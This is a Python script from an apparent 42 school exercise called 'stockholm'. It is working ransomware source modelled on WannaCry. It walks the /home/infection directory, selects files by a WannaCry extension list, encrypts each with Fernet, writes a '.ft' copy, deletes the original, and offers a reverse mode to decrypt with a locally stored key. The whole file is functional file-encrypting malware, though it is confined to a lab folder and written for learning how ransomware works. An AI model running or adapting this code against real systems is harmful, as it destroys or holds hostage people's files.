# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: hubourge <hubourge@student.42angouleme.    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/06/18 17:28:06 by hubourge          #+#    #+#              #
#    Updated: 2025/06/20 16:10:35 by hubourge         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import argparse
import sys
import os
import base64
import hashlib
from cryptography.fernet import Fernet

def parser():
    parser = argparse.ArgumentParser(
        description="Stockholm will encrypt files at /home/infection directory using a key and add \".ft\" extension to the file."
    )
    parser.add_argument("-v", "-version", action="store_true", help="Show version")
    parser.add_argument("-r", "-reverse", action="store_true", help="Reverse input")
    parser.add_argument("-s", "-silent", action="store_true", help="Silent mode")

    args = parser.parse_args()
    if args.v:
        print("Version 0.1")
        exit(0)
    return args

def checkPermissions(path):
    if not os.path.exists(path):
        print(f"Error: The directory {path} does not exist.")
        sys.exit(1)
    if not os.access(path, os.R_OK):
        print(f"Error: Permission denied to access {path}.")
        sys.exit(1)

def getFiles(path, extension_path):
    try:
        with open(extension_path, "r") as f:
            extension = f.read()
    except FileNotFoundError:
        print(f"Error: The file {extension_path} does not exist.")
        sys.exit(1)

    checkPermissions(path)
    files = []
    for root, dirs, filenames in os.walk(path):
        for filename in filenames:
            fileExtension = '.' + filename.split(".")[-1]
            if fileExtension in extension or fileExtension == ".ft":
                files.append(os.path.join(root, filename))
    return files

def getFilesFT(files):
    filesFT = []
    for file in files:
        if file.endswith(".ft"):
            filesFT.append(file)
    return filesFT

def getNewKey():
    key = os.urandom(16).hex()
    try:
        with open("key.txt", "w") as f:
            f.write(key)
    except IOError as e:
        print(f"Error writing to key.txt: {e}")
        sys.exit(1)
        
    print("Generate new secret key and save it in key.txt")
    return key

def checkValidKey(key):
    if len(key) != 32 or not all(c in '0123456789abcdefABCEF' for c in key):
        print("Error: Invalid key format. Key must be 32-character hexadecimal string.")
        sys.exit(1)
    return True

def key_from_hex(key):
    # Convert hexadecimal to base64-encoded
    raw_key = bytes.fromhex(key)
    sha256_key = hashlib.sha256(raw_key).digest()[:32]
    return base64.urlsafe_b64encode(sha256_key)

def encrypt_algo(data, key):
    fernet_key = key_from_hex(key)
    fernet = Fernet(fernet_key)
    return fernet.encrypt(data)
    
def encrypt(files, key, silent=False):
    for file in files:
        if file.endswith(".ft"):
            continue
        if not silent:
            print(f"Encrypting {file}...")
        try:
            with open(file, "rb") as f:
                data = f.read()
            encrypted = encrypt_algo(data, key)
            with open(file + ".ft", "wb") as f:
                f.write(encrypted)
            os.remove(file)
        except Exception as e:
            print(f"Error encrypting {file}: {e}")
            continue

def decrypt_algo(data, key):
    fernet_key = key_from_hex(key)
    fernet = Fernet(fernet_key)
    return fernet.decrypt(data)

def decrypt(files, key, silent=False):
    for file in files:
        if not silent:
            print(f"Decrypting {file}...")
        if not file.endswith(".ft"):
            continue
        try:
            with open(file, "rb") as f:
                data = f.read()
            decrypted = decrypt_algo(data, key)
            original_file = file[:-3]
            with open(original_file, "wb") as f:
                f.write(decrypted)
            os.remove(file)
        except Exception as e:
            print(f"Error decrypting {file}: {e}")
            continue

def main():
    args = parser()
    files = getFiles("/home/infection", "wannacry_file_extensions.txt")

    if not os.path.exists("key.txt"):
        key = getNewKey()
    else:
        try:
            with open("key.txt", "r") as f:
                key = f.read()
                checkValidKey(key)
        except FileNotFoundError:
            print("Error: key.txt not found. Generating a new key.")
            key = getNewKey()
        except Exception as e:
            print(f"Error reading key.txt: {e}")
            sys.exit(1)

    if not args.s:
        print(f"Secret key: {key}")

    if not args.r:
        encrypt(files, key, args.s)
    else:
        files = getFilesFT(files)
        decrypt(files, key, args.s)

if __name__ == "__main__":
    main()